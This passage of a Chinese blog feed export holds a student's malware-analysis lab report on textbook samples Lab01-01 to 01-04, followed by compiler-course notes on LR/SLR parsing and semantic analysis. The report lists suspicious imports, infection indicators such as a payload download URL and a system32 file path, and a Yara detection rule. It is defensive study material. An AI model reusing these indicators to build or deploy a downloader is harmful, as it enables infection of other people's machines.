</blockquote>
<p><img src="/../../../themes/butterfly/source/img/mypic/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/image-20240917143201548.png" alt="image-20240917143201548"></p>
<blockquote>
<p>VT也识别出了其hash值，string等相关特征</p>
</blockquote>
<p><img src="/../../../themes/butterfly/source/img/mypic/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/image-20240917143225873.png" alt="image-20240917143225873"></p>
<blockquote>
<p>可执行文件特征，可以初步判断其加了壳（很少section）</p>
</blockquote>
<p><img src="/../../../themes/butterfly/source/img/mypic/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/image-20240917143254691.png" alt="image-20240917143254691"></p>
<blockquote>
<p>sandbox测试，可初步判断软件行文，如网络等。</p>
</blockquote>
<p><img src="/../../../themes/butterfly/source/img/mypic/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/image-20240917143344726.png" alt="image-20240917143344726"></p>
</li>
<li><h4 id="Q2-是否有这个文件被加壳或混淆的任何迹象-如果是这样-这些迹象是什么-如果该文件被加壳-请进行脱壳-如果可能的话。-1"><a href="#Q2-是否有这个文件被加壳或混淆的任何迹象-如果是这样-这些迹象是什么-如果该文件被加壳-请进行脱壳-如果可能的话。-1" class="headerlink" title="Q2.是否有这个文件被加壳或混淆的任何迹象?如果是这样,这些迹象是什么?如果该文件被加壳,请进行脱壳,如果可能的话。"></a>Q2.是否有这个文件被加壳或混淆的任何迹象?如果是这样,这些迹象是什么?如果该文件被加壳,请进行脱壳,如果可能的话。</h4><blockquote>
<p>可以识别出来加壳，但没有表明壳的类型</p>
</blockquote>
<p><img src="/../../../themes/butterfly/source/img/mypic/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/image-20240917143741406.png" alt="image-20240917143741406"></p>
<blockquote>
<p>切换peid可以识别壳的类型</p>
</blockquote>
<p><img src="/../../../themes/butterfly/source/img/mypic/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/image-20240917144159621.png" alt="image-20240917144159621"></p>
<blockquote>
<p>多脱几次壳则可以脱壳成功</p>
</blockquote>
<p><img src="/../../../themes/butterfly/source/img/mypic/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/image-20240921235714078.png" alt="image-20240921235714078"></p>
</li>
<li><h4 id="Q3-有没有任何导入函数能够暗示出这个程序的功能-如果是-是哪些导入函数-它们会告诉你什么-1"><a href="#Q3-有没有任何导入函数能够暗示出这个程序的功能-如果是-是哪些导入函数-它们会告诉你什么-1" class="headerlink" title="Q3.有没有任何导入函数能够暗示出这个程序的功能?如果是,是哪些导入函数,它们会告诉你什么?"></a>Q3.有没有任何导入函数能够暗示出这个程序的功能?如果是,是哪些导入函数,它们会告诉你什么?</h4><blockquote>
<p>查看ida导入表</p>
</blockquote>
<p><img src="/../../../themes/butterfly/source/img/mypic/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/image-20240921235834010.png" alt="image-20240921235834010"></p>
<blockquote>
<p>通过导入函数初步分析程序功能：</p>
</blockquote>
<p><strong>标准 C 运行时库 (MSVCRT) 函数：</strong></p>
<ul>
<li><strong>_main、_start</strong>：这些是标准的程序入口函数，表明该程序遵循传统的C&#x2F;C++程序的执行流程。</li>
<li><strong>_XcptFilter、_except_handler3</strong>：异常处理相关函数，表明该程序可能处理运行时异常或错误。</li>
<li><strong>_initterm</strong>：用于初始化全局或静态对象，这也是标准C&#x2F;C++程序的一部分。</li>
<li><strong>_controlfp</strong>：用于控制浮点处理器的状态，这可能是为了进行精确的数值计算或避免浮点异常。</li>
<li><strong>_setdefaultprecision</strong>：设置默认浮点精度，进一步表明该程序可能涉及复杂的数学运算。</li>
<li><strong>_exit、exit</strong>：退出函数，用于正常终止程序。</li>
</ul>
<p><strong>其他库函数：</strong></p>
<ul>
<li><strong>VariantInit、SysAllocString、SysFreeString</strong>（OLEAUT32 库）：这些函数与 OLE 自动化有关，可能涉及到COM对象的创建和管理，表明该程序可能与 Windows 的自动化技术或脚本编写语言有交互。</li>
<li><strong>OleInitialize、CoCreateInstance、OleUninitialize</strong>（ole32 库）：这些函数用于初始化和管理 COM 对象，表明该程序可能使用了 COM 进行进程间通信或调用外部组件。</li>
</ul>
</li>
<li><h4 id="Q4-有哪些基于主机或基于网络的迹象-可以被用来确定被这个恶意代码所感染的机器"><a href="#Q4-有哪些基于主机或基于网络的迹象-可以被用来确定被这个恶意代码所感染的机器" class="headerlink" title="Q4.有哪些基于主机或基于网络的迹象,可以被用来确定被这个恶意代码所感染的机器?"></a>Q4.有哪些基于主机或基于网络的迹象,可以被用来确定被这个恶意代码所感染的机器?</h4><blockquote>
<p>hex可以看到服务器地址，可以作为一个迹象</p>
</blockquote>
<p><img src="/../../../themes/diaspora/source/img/mypic/com/image-20240922000239921.png" alt="image-20240922000239921"></p>
</li>
</ul>
<h3 id="lab-1-4"><a href="#lab-1-4" class="headerlink" title="lab 1-4"></a><strong>lab 1-4</strong></h3><blockquote>
<p>分析Lab01-04.exe</p>
</blockquote>
<ul>
<li><h4 id="Q1-将Lab01-04-exe-文件上传至http-www-VirusTotal-com-进行分析并查看报告。文件匹配到了已有的反病毒软件特征吗"><a href="#Q1-将Lab01-04-exe-文件上传至http-www-VirusTotal-com-进行分析并查看报告。文件匹配到了已有的反病毒软件特征吗" class="headerlink" title="Q1.将Lab01-04.exe 文件上传至http://www.VirusTotal.com/进行分析并查看报告。文件匹配到了已有的反病毒软件特征吗?"></a>Q1.将Lab01-04.exe 文件上传至<a href="http://www.virustotal.com/%E8%BF%9B%E8%A1%8C%E5%88%86%E6%9E%90%E5%B9%B6%E6%9F%A5%E7%9C%8B%E6%8A%A5%E5%91%8A%E3%80%82%E6%96%87%E4%BB%B6%E5%8C%B9%E9%85%8D%E5%88%B0%E4%BA%86%E5%B7%B2%E6%9C%89%E7%9A%84%E5%8F%8D%E7%97%85%E6%AF%92%E8%BD%AF%E4%BB%B6%E7%89%B9%E5%BE%81%E5%90%97">http://www.VirusTotal.com/进行分析并查看报告。文件匹配到了已有的反病毒软件特征吗</a>?</h4><blockquote>
<p>90%都判定为恶意软件，基本已经可以判定为恶意软件了</p>
</blockquote>
<p><img src="/../../../themes/butterfly/source/img/mypic/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/image-20240922000412766.png" alt="image-20240922000412766"></p>
<blockquote>
<p>文件特征</p>
</blockquote>
<p><img src="/../../../themes/butterfly/source/img/mypic/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/image-20240922000439753.png" alt="image-20240922000439753"></p>
<blockquote>
<p>pe特征</p>
</blockquote>
<p><img src="/../../../themes/butterfly/source/img/mypic/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/image-20240922000508786.png" alt="image-20240922000508786"></p>
<blockquote>
<p>沙箱行为检测：</p>
</blockquote>
<p><img src="/../../../themes/butterfly/source/img/mypic/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/image-20240922000559304.png" alt="image-20240922000559304"></p>
</li>
<li><h4 id="Q2-是否有这个文件被加壳或混淆的任何迹象-如果是这样-这些迹象是什么-如果该文件被加壳-请进行脱壳-如果可能的话。-2"><a href="#Q2-是否有这个文件被加壳或混淆的任何迹象-如果是这样-这些迹象是什么-如果该文件被加壳-请进行脱壳-如果可能的话。-2" class="headerlink" title="Q2.是否有这个文件被加壳或混淆的任何迹象?如果是这样,这些迹象是什么?如果该文件被加壳,请进行脱壳,如果可能的话。"></a>Q2.是否有这个文件被加壳或混淆的任何迹象?如果是这样,这些迹象是什么?如果该文件被加壳,请进行脱壳,如果可能的话。</h4><blockquote>
<p>未加壳</p>
</blockquote>
<p><img src="/../../../themes/butterfly/source/img/mypic/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/image-20240922000706625.png" alt="image-20240922000706625"></p>
<blockquote>
<p>未混淆</p>
</blockquote>
<p><img src="/../../../themes/butterfly/source/img/mypic/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/image-20240922000901861.png" alt="image-20240922000901861"></p>
</li>
<li><h4 id="Q3-这个文件是什么时候被编译的"><a href="#Q3-这个文件是什么时候被编译的" class="headerlink" title="Q3.这个文件是什么时候被编译的?"></a>Q3.这个文件是什么时候被编译的?</h4><blockquote>
<p>utc时间2019年8&#x2F;30 22:26:59,在vt分析的时候可以看出时间显然伪造，因此无法确定啥时候编译</p>
</blockquote>
<p><img src="/../../../themes/butterfly/source/img/mypic/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/image-20240922001028830.png" alt="image-20240922001028830"></p>
</li>
<li><h4 id="Q4-有没有任何导入函数能够暗示出这个程序的功能-如果是-是哪些导入函数-它们会告诉你什么"><a href="#Q4-有没有任何导入函数能够暗示出这个程序的功能-如果是-是哪些导入函数-它们会告诉你什么" class="headerlink" title="Q4.有没有任何导入函数能够暗示出这个程序的功能?如果是,是哪些导入函数,它们会告诉你什么?"></a>Q4.有没有任何导入函数能够暗示出这个程序的功能?如果是,是哪些导入函数,它们会告诉你什么?</h4><blockquote>
<h3 id="1-KERNEL32-库函数："><a href="#1-KERNEL32-库函数：" class="headerlink" title="1. KERNEL32 库函数："></a>1. <strong>KERNEL32 库函数：</strong></h3><ul>
<li><strong>GetProcAddress、LoadLibraryA</strong>：这两个函数通常用于动态加载DLL并获取函数的地址，表明该程序可能通过动态加载来规避静态分析，或根据需求加载特定的模块执行恶意行为。</li>
<li><strong>WinExec</strong>：用于执行外部程序，表明该恶意程序可能会启动其他进程，执行恶意命令或启动外部程序以进一步实施攻击。</li>
<li><strong>CreateFileA、WriteFile</strong>：这两个函数用于创建或打开文件，并向文件中写入数据，表明该程序可能涉及文件操作，如记录信息或修改系统文件。</li>
<li><strong>SizeofResource、FindResourceA、LoadResource</strong>：这些函数用于加载和管理资源，可能与提取或注入资源相关，如恶意载荷的注入。</li>
<li><strong>CreateRemoteThread</strong>：该函数常用于进程注入，将线程注入到其他进程中执行代码，表明该程序可能具有进程注入功能。</li>
<li><strong>OpenProcess、GetCurrentProcess、GetModuleHandleA</strong>：这些函数与进程操作相关，可能用于操纵当前进程或目标进程，表明程序可能会修改或监控进程行为。</li>
<li><strong>MoveFileA、GetTempPathA</strong>：这些函数与文件操作有关，可能用于移动文件或在临时目录中创建文件，暗示该程序可能会自我复制或进行文件覆盖。</li>
</ul>
<h3 id="2-ADVAPI32-库函数："><a href="#2-ADVAPI32-库函数：" class="headerlink" title="2. ADVAPI32 库函数："></a>2. <strong>ADVAPI32 库函数：</strong></h3><ul>
<li><strong>OpenProcessToken、LookupPrivilegeValueA、AdjustTokenPrivileges</strong>：这些函数用于调整权限令牌，表明该程序可能尝试获取更高的系统权限（如提升权限），以执行更高级别的操作，可能会规避权限限制。</li>
</ul>
<h3 id="3-MSVCRT-库函数："><a href="#3-MSVCRT-库函数：" class="headerlink" title="3. MSVCRT 库函数："></a>3. <strong>MSVCRT 库函数：</strong></h3><ul>
<li><strong>_snprintf、_exit、exit</strong>：这些是标准的C库函数，与字符串操作和程序退出相关，表明该程序可能有格式化数据并在特定条件下终止自身的功能。</li>
<li><strong>_XcptFilter、_except_handler3</strong>：与异常处理相关，表明程序可能具备处理运行时异常的机制，这可以用于防止程序崩溃或捕获异常以执行特定行为。</li>
<li>其他常见初始化和处理函数（如**_initterm、__p__fmode**等）用于处理程序的运行环境。</li>
</ul>
</blockquote>
<p><img src="/../../../themes/butterfly/source/img/mypic/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/image-20240922001253455.png" alt="image-20240922001253455"></p>
<p>表明该程序可能具备以下特性：</p>
<ul>
<li>动态加载模块和函数，规避静态分析。</li>
<li>对文件和进程进行操作，可能进行进程注入或启动外部程序。</li>
<li>提升自身权限，执行更高级别的操作。</li>
<li>文件操作（如创建、移动文件），可能用于数据泄露、覆盖或恶意文件的部署。</li>
</ul>
</li>
<li><h4 id="Q5-有哪些基于主机或基于网络的迹象-可以被用来确定被这个恶意代码所感染的机器"><a href="#Q5-有哪些基于主机或基于网络的迹象-可以被用来确定被这个恶意代码所感染的机器" class="headerlink" title="Q5.有哪些基于主机或基于网络的迹象,可以被用来确定被这个恶意代码所感染的机器?"></a>Q5.有哪些基于主机或基于网络的迹象,可以被用来确定被这个恶意代码所感染的机器?</h4><blockquote>
<p>字符串\system32\wupdmgr.exe 表示,这个程序会在这个位置创建或者修改文件。字符串<br><a href="http://www.malwareanalysisbook.com/updater.exe%E5%8F%AF%E8%83%BD%E8%A1%A8%E7%A4%BA%E9%A2%9D%E5%A4%96%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E7%9A%84%E7%BD%91%E8%B7%AF%E5%AD%98%E5%82%A8%E4%BD%8D%E7%BD%AE,%E7%94%A8%E4%BA%8E">www.malwareanalysisbook.com/updater.exe可能表示额外恶意代码的网路存储位置,用于</a><br>下载。</p>
</blockquote>
<p><img src="/../../../themes/butterfly/source/img/mypic/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/image-20240922001735220.png" alt="image-20240922001735220"></p>
</li>
<li><h4 id="Q6-这个文件在资源段中包含一个资源。使用Resource-Hacker工具来检查资源-然后抽取资源。从资源中你能发现什么吗"><a href="#Q6-这个文件在资源段中包含一个资源。使用Resource-Hacker工具来检查资源-然后抽取资源。从资源中你能发现什么吗" class="headerlink" title="Q6.这个文件在资源段中包含一个资源。使用Resource Hacker工具来检查资源,然后抽取资源。从资源中你能发现什么吗?"></a>Q6.这个文件在资源段中包含一个资源。使用Resource Hacker工具来检查资源,然后抽取资源。从资源中你能发现什么吗?</h4><blockquote>
<p>可以从其中看到一段网址，可能是用来下载病毒</p>
</blockquote>
<p><img src="/../../../themes/butterfly/source/img/mypic/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/image-20240922002230289.png" alt="image-20240922002230289"></p>
</li>
</ul>
<h3 id="MicroSoft-Defender-AntiVirus检测结果"><a href="#MicroSoft-Defender-AntiVirus检测结果" class="headerlink" title="MicroSoft Defender AntiVirus检测结果"></a>MicroSoft Defender AntiVirus检测结果</h3><blockquote>
<p>可以看出可以有效检测出病毒特征</p>
</blockquote>
<ul>
<li><p>lab1-1</p>
<blockquote>
<p>Trojan:Win32&#x2F;Aenjaris.CT!bit</p>
<p>是木马家族Aenjaris</p>
</blockquote>
<p><img src="/../../../themes/butterfly/source/img/mypic/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/image-20240922014035272.png" alt="image-20240922014035272"></p>
</li>
<li><p>lab 1-2</p>
<blockquote>
<p> Trojan:Win32&#x2F;Graftor.GPA!MTB</p>
<p>木马家族GPA</p>
</blockquote>
</li>
</ul>
<p><img src="/../../../themes/butterfly/source/img/mypic/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/image-20240922013625425.png" alt="image-20240922013625425"></p>
<ul>
<li><p>lab1-3</p>
<blockquote>
<p> Trojan:Win32&#x2F;Graftor.GPA!MTB</p>
<p>木马家族GPA</p>
</blockquote>
<p><img src="/../../../themes/butterfly/source/img/mypic/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/image-20240922013743775.png" alt="image-20240922013743775"></p>
</li>
<li><p>lab1-4</p>
<blockquote>
<p>TrojanDownloader:Win32&#x2F;Small!MSR</p>
<p>木马下载器</p>
</blockquote>
<p><img src="/../../../themes/butterfly/source/img/mypic/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/image-20240922013723209.png" alt="image-20240922013723209"></p>
</li>
</ul>
<h3 id="编写Yara规则"><a href="#编写Yara规则" class="headerlink" title="编写Yara规则"></a>编写Yara规则</h3><blockquote>
<p>因为加壳的原因，因此主要基于hex来进行恶意文件扫描</p>
</blockquote>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import &quot;pe&quot;</span><br><span class="line">rule malstring </span><br><span class="line">&#123; </span><br><span class="line">    strings:</span><br><span class="line">        $malstring = &quot;C:\\windows\\system32\\kerne132.dll&quot;</span><br><span class="line">        $malstring2 = &#123;07 68 74 74 70 3A 2F 2F 77 FF B7 BF DD 00 2E 6D 1E 77 61 72 65 61 6E 07 79 73 69 73 62 6F 6F 6B&#125; //.http://w......m.warean.ysisbook</span><br><span class="line">        $l3 = &#123;00 6F 6C 65 33 32&#125;</span><br><span class="line">        $l4 = &#123;00 68 74 74 70 3A 2F 2F 77 77 77 2E 70 72 61 63 74 69 63 61 6C 6D 61 </span><br><span class="line">                6C 77 61 72 65 61 6E 61 6C 79 73 69 73 2E 63 6F 6D 2F 75 70 64 61 74 </span><br><span class="line">                65 72 2E 65 78 65 00&#125;</span><br><span class="line">    condition:</span><br><span class="line">        $malstring or $malstring2 or $l3 or $l4</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p>结果</p>
</blockquote>
<p><img src="/../../../themes/butterfly/source/img/mypic/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/image-20240922012941523.png"></p>
<h2 id="四、实验结论及心得体会"><a href="#四、实验结论及心得体会" class="headerlink" title="四、实验结论及心得体会"></a><strong>四、实验结论及心得体会</strong></h2><p>通过本次实验，我对恶意软件分析的基础步骤有了更加深入的理解，包括静态分析和动态分析的基本流程和技术细节。在实验中，我分别使用了VirusTotal、PE分析工具和反汇编工具（如IDA Pro）对样本进行了深入的分析，并且通过资源提取工具（如Resource Hacker）对样本内嵌的资源进行了剖析。</p>
<h3 id="1-PE-文件结构分析"><a href="#1-PE-文件结构分析" class="headerlink" title="1. PE 文件结构分析"></a>1. <strong>PE 文件结构分析</strong></h3><p>在分析样本的过程中，通过学习PE文件结构，我能够识别出每个部分的作用。例如，导入表显示了样本依赖的库和函数，这有助于初步判断恶意代码的潜在功能。而通过对各节的熵值进行分析，可以判断文件是否被加壳或混淆。</p>
<h3 id="2-加壳与脱壳"><a href="#2-加壳与脱壳" class="headerlink" title="2. 加壳与脱壳"></a>2. <strong>加壳与脱壳</strong></h3><p>在实验中，遇到部分样本使用了UPX壳，通过自动化工具和手动方式脱壳成功。学习了加壳与脱壳的基本概念，并了解了不同加壳工具对样本保护和体积压缩的效果。加壳是恶意软件常见的隐藏技术，脱壳后分析才能获取更详细的行为信息。</p>
<h3 id="3-Yara-规则编写"><a href="#3-Yara-规则编写" class="headerlink" title="3. Yara 规则编写"></a>3. <strong>Yara 规则编写</strong></h3><p>通过观察不同样本的特征，我学习了如何提取关键的字符串、函数调用、文件结构信息等，并编写了简单的Yara规则来检测类似恶意样本。在实际分析中，这些规则帮助我们自动化检测和分类恶意软件。</p>
<h3 id="4-病毒传播机制的理解"><a href="#4-病毒传播机制的理解" class="headerlink" title="4. 病毒传播机制的理解"></a>4. <strong>病毒传播机制的理解</strong></h3><p>部分样本通过修改系统的动态链接库（如kernel32.dll）或感染系统文件来实现持久化，这加深了我对恶意软件持久化技术的认识。此外，分析到的网络行为（如通过特定域名进行通信）也展现了恶意软件的远程控制和命令执行能力。</p>
<h3 id="5-网络通信与远程操作"><a href="#5-网络通信与远程操作" class="headerlink" title="5. 网络通信与远程操作"></a>5. <strong>网络通信与远程操作</strong></h3><p>在分析中，部分样本使用了网络相关的库（如ws2_32.dll），通过对这些函数的深入理解，可以分析出恶意软件与远程服务器的通信机制。这也引导了我对恶意软件行为的进一步分析，如远程命令执行、文件下载等。</p>
<h3 id="6-实验中的收获与不足"><a href="#6-实验中的收获与不足" class="headerlink" title="6. 实验中的收获与不足"></a>6. <strong>实验中的收获与不足</strong></h3><ul>
<li>通过实验，我掌握了多种分析恶意软件的方法和工具，如VirusTotal、IDA、010Editor等，也增强了对PE文件结构、加壳脱壳、动态分析、Yara规则等的实际应用能力。</li>
<li>在分析过程中，我认识到恶意软件往往使用复杂的技术手段，如混淆、加壳、API调用混淆等来对抗分析人员。这要求分析人员具备扎实的逆向工程能力，并且需要持续学习新的恶意软件技术。</li>
<li>但在实际的恶意软件分析中，部分复杂的样本可能涉及更多高级技术，如代码混淆和反调试，需要进一步学习高级的反混淆和反调试技术。</li>
</ul>
<p>通过这次实验，我对恶意软件分析的核心流程有了更系统的认识，同时也对Yara规则的编写和使用有了更深入的理解。这为我后续的恶意软件研究和安全分析奠定了良好的基础。</p>
]]></content>
      <categories>
        <category>恶意代码</category>
      </categories>
      <tags>
        <tag>恶意代码</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>/2024/09/19/%E5%AF%86%E7%A0%81%E5%AD%A6/%E4%BF%A1%E6%81%AF%E8%AE%BA/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>关于parser的语法树生成算法（实现）</title>
    <url>/2024/08/01/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86paser%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h2 id="Week-5-and-Week-6"><a href="#Week-5-and-Week-6" class="headerlink" title="Week 5 and Week 6"></a>Week 5 and Week 6</h2><blockquote>
<p>首先是提出算法实现前的一些铺垫，主要包括以下知识：</p>
<p>1.Top-Down and Bottom-Up</p>
<p>2.Shift-Reduce Parsing</p>
<p>3.一些notation为了算法实现做铺垫</p>
</blockquote>
<h3 id="1-Top-Down-and-Bottom-Up"><a href="#1-Top-Down-and-Bottom-Up" class="headerlink" title="1.Top-Down and Bottom-Up"></a>1.Top-Down and Bottom-Up</h3><p>Top-Down对应先前讲的leftmost，而Bottom-Up则对应先前讲的rightmost，Week 4是从易于理解的角度讲解，而本周则是从实现的角度讲解。主要涉及到了如何shift，如何reduce，以及如何生成树，但是没有讲什么时候。</p>
<h3 id="2-Shift-Reduce-Parsing"><a href="#2-Shift-Reduce-Parsing" class="headerlink" title="2.Shift-Reduce Parsing"></a>2.Shift-Reduce Parsing</h3><p>基于Top-Down and Bottom-Up引出的语法解析实现的简单模型，初步引入了一些notation，如</p>
<p><img src="/img/mypic/com/192717-17226163867168.png" alt="192717"></p>
<p>主要解决了在哪reduce的问题<img src="/img/mypic/com/192952-17226163831407.png" alt="192952"></p>
<p>期间讲了一个插曲，也就是冲突（conflict）的解决方法：</p>
<p>一个为：shift和reduce的冲突，可被precedence and associativity declaration修复，类似于leftmost 或者rightmost，如加法和乘法的优先级。</p>
<p>另一个： reduce-reduce conflict，不知道该选择哪一个规则，说明： There is ambiguity in the grammar ，Might be fixed by additional lookahead，这个类似于两个规则冲突</p>
<h3 id="3-When-to-shift-reduce"><a href="#3-When-to-shift-reduce" class="headerlink" title="3.When to shift&#x2F;reduce?"></a>3.When to shift&#x2F;reduce?</h3><p>接着讲什么时候解决冲突，主要引入了prefix and handle</p>
<p><img src="/img/mypic/com/193651-17226163759036.png" alt="193651-17226163759036"></p>
<p>然后将了语法规范（specific）和parser的关系，核心在这张图：基本观点是，规范越简单解析器越简单，解析器无法准确识别所用的上下文无关语法（CFG），解析器的实现也需要效率和功能的trade-off</p>
<p><img src="/img/mypic/com/193848-17226163733105.png" alt="193848-17226163733105"></p>
<h3 id="3-When-to-shift-reduce-realize"><a href="#3-When-to-shift-reduce-realize" class="headerlink" title="3.When to shift&#x2F;reduce?realize"></a>3.When to shift&#x2F;reduce?realize</h3><h4 id="algorithm-1（LR0）"><a href="#algorithm-1（LR0）" class="headerlink" title="algorithm 1（LR0）"></a>algorithm 1（LR0）</h4><blockquote>
<p>关键在于构造action和goto两张表格</p>
<p>构造上述两张表格需要知道Configuration set</p>
<p>构造configuration set需要知道如何计算Closure property</p>
</blockquote>
<ul>
<li><p>action和goto表格的状态转移可看下表：</p>
<p>只需要注意一点的就是其状态转移只和stack头的元素有关，当弹出元素之后的状态转移也是如此</p>
<p><img src="/img/mypic/com/235730.png" alt="235730"></p>
</li>
<li><p>closure的构造</p>
<p>把所有的非终结符递归的转换即可</p>
<p><img src="/img/mypic/com/000108-17226163667684.png" alt="2024-08-03 000108-17226163667684"></p>
</li>
<li><p>Successor(I, X)的构造</p>
<blockquote>
<p>类似于状态转移后的状态的构造，状态转移需要移动圆点</p>
</blockquote>
<p><img src="/img/mypic/com/image-20240803000246178.png" alt="image-20240803000246178"></p>
</li>
<li><p>configuration set的构造</p>
<p><img src="/img/mypic/com/image-20240803000332150-17226163592833.png" alt="image-20240803000332150"></p>
</li>
<li><p>action和goto的表格获得</p>
<p><img src="/img/mypic/com/image-20240803000701647-17226163557042.png" alt="image-20240803000701647"></p>
</li>
<li><p>需要注意的地方</p>
<blockquote>
<p>1.状态不要重复，状态也不能少</p>
<p>2.若出现冲突说明grammar定义的不好</p>
</blockquote>
<p>如此例子：则出现了reduce和shift冲突和reduce和reduce冲突，注意有的并非冲突，可以一个状态多次操作</p>
<p><img src="/img/mypic/com/image-20240803000826163-17226162670141.png" alt="image-20240803000826163"></p>
<p><img src="/img/mypic/com/image-20240803001104451.png" alt="image-20240803001104451"></p>
</li>
</ul>
<h4 id="algorithm-2（SLR1）"><a href="#algorithm-2（SLR1）" class="headerlink" title="algorithm 2（SLR1）"></a>algorithm 2（SLR1）</h4><blockquote>
<p>关键在于知道first（X）和follow（X）的定义，进而shift操作和reduce操作以及reduce-reduce的conflict都可以从follow（X）的定义解决，当然也有语法不满足的情况。</p>
<p>总结就是通过可以观察即将输入的terminal来判断是否执行push操作，或者直接执行reduce操作，因此称为SLR1，然后再根据执行操作后入栈的元素来实现状态转移，也就是说在入栈的那一刻状态也转移了，栈顶存储的就是此时的state</p>
<p>需注意一次状态一次操作，即state-&gt;action-&gt;new_state(根据action后的栈顶元素决定)</p>
</blockquote>
<ul>
<li><p>例子：在reduce阶段可以认为是（pop+push）然后进入新状态。</p>
<p><img src="/img/mypic/com/image-20240803224138802.png" alt="image-20240803224138802"></p>
</li>
</ul>
<h4 id="algorithm-3（SLR）"><a href="#algorithm-3（SLR）" class="headerlink" title="algorithm 3（SLR）"></a>algorithm 3（SLR）</h4><blockquote>
<p>讲看follow来构造configuration set改为根据看lookahead，更加细粒化，其他没有什么不一样的</p>
</blockquote>
<h3 id="5-优先级precedence"><a href="#5-优先级precedence" class="headerlink" title="5.优先级precedence"></a>5.优先级precedence</h3><blockquote>
<p>不是通过更改语法来实现，而是给算法增加额外规则，也就是人为增加何时reduce or shift，以减少此类冲突情形。</p>
</blockquote>
]]></content>
      <categories>
        <category>compiler</category>
      </categories>
      <tags>
        <tag>compiler</tag>
      </tags>
  </entry>
  <entry>
    <title>语义分析</title>
    <url>/2024/09/15/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/%E8%AF%AD%E4%B9%89%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p>语义分析在语法树的基础上，对程序作进一步的检查，来看程序是否是meaningful</p>
<h2 id="符号检查"><a href="#符号检查" class="headerlink" title="符号检查"></a>符号检查</h2><h3 id="1-符号表"><a href="#1-符号表" class="headerlink" title="1.符号表"></a>1.符号表</h3><blockquote>
<p>保存各种符号相关信息的数据结构</p>
</blockquote>
<p><img src="/img/mypic/com/image-20240909165833568-17270667290501.png" alt="image-20240909165833568"></p>
<blockquote>
<p>本节内容涉及教材</p>
</blockquote>
<p><img src="/../../../themes/butterfly/source/img/mypic/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/image-20240909175211517.png" alt="image-20240909175211517"></p>
<h3 id="1-1作用域相关"><a href="#1-1作用域相关" class="headerlink" title="1.1作用域相关"></a>1.1作用域相关</h3><blockquote>
<p>嵌套作用域需要嵌套符号表，全局作用域还需放入类型符号以支持类型检查。</p>
</blockquote>
<p><img src="/img/mypic/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/image-20240909170554630.png" alt="image-20240909170554630"></p>
<blockquote>
<p>符号表的实现的接口</p>
</blockquote>
<p><img src="/../../../themes/butterfly/source/img/mypic/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/image-20240909170955204.png" alt="image-20240909170955204"></p>
<blockquote>
<p>所要考虑的</p>
</blockquote>
<p><img src="/img/mypic/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/image-20240909172231667.png" alt="image-20240909172231667"></p>
<h3 id="2-文法分析（语义）（以类型为例子）（语法制导的定义）"><a href="#2-文法分析（语义）（以类型为例子）（语法制导的定义）" class="headerlink" title="2.文法分析（语义）（以类型为例子）（语法制导的定义）"></a>2.文法分析（语义）（以类型为例子）（语法制导的定义）</h3><blockquote>
<p>如何赋予语法树语义，并计算相应的节点的属性？通过赋予每个节点的类型相应属性的相应值来实现，实现过程主要有监听器的模式（遍历两次ast）或者直接写（嵌入到产生式之中，但是只需要遍历一次）</p>
</blockquote>
<p><img src="/img/mypic/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/image-20240909191503457.png" alt="image-20240909191503457"></p>
<blockquote>
<p>处理依赖关系，分别有上对下，水平，和下对上。做法：将action嵌入cfg</p>
</blockquote>
<p><img src="/../../../themes/butterfly/source/img/mypic/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/image-20240909195422145.png" alt="image-20240909195422145"></p>
<p><img src="/img/mypic/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/image-20240909195708884.png" alt="image-20240909195708884"></p>
<blockquote>
<p>综合属性。</p>
</blockquote>
<p><img src="/../../../themes/butterfly/source/img/mypic/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/image-20240909195930229.png" alt="image-20240909195930229"></p>
<blockquote>
<p>继承属性。</p>
</blockquote>
<p><img src="/img/mypic/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/image-20240909200212195.png" alt="image-20240909200212195"></p>
<blockquote>
<p>继承与综合属性的综合。主要涉及到数组类型。</p>
</blockquote>
